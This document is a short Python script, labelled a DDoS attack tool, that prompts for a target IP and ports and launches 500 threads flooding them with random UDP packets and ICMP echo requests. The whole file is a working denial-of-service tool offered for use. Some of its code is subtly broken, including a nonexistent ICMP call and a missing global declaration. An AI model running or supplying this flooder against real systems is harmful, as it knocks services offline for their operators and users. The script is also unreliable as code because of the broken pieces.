import socket
import random
import threading
from scapy.all import *
import os
import time

target_ip = input("Enter target IP: ")
target_ports = list(map(int, input("Enter ports to target, separated by commas (e.g., 80,443,25): ").split(',')))  # Attack configuration

packets_sent = 0  # Инициализация переменной для подсчета пакетов
attack_num = 0  # Инициализация переменной для подсчета атак
start_time = time.time()  # Запись времени начала

def udp_flood():
    global packets_sent
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            for port in target_ports:
                data_size = random.randint(64, 1024)
                packet_data = os.urandom(data_size)
                s.sendto(packet_data, (target_ip, port))
                packets_sent += 1
            
            # Send additional ICMP echo requests to overwhelm router resources 
            icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            icmp_socket.setsockopt(socket.SOL_IP, socket.IP_SOURCE_ROUTE, "1")
            for _ in range(5):
                icmp_socket.sendto(icmp.ECHO_REQUEST(target_ip), (target_ip, 33434))
            attack_num += 1
        except Exception as e:
            print(f"Error: {e}")  # Вывод ошибки

def show_status():
    global packets_sent
    print(f"\nDDoS Attack Status:")
    print(f"Total Packets Sent: {packets_sent}")
    print(f"Packets per Second: {(packets_sent / (time.time() - start_time)):.2f}")

# Запуск потоков
for i in range(500):
    thread = threading.Thread(target=udp_flood)
    thread.start()

# Отображение статуса
while True:
    show_status()
    time.sleep(1)  # Задержка перед следующим отображением статуса
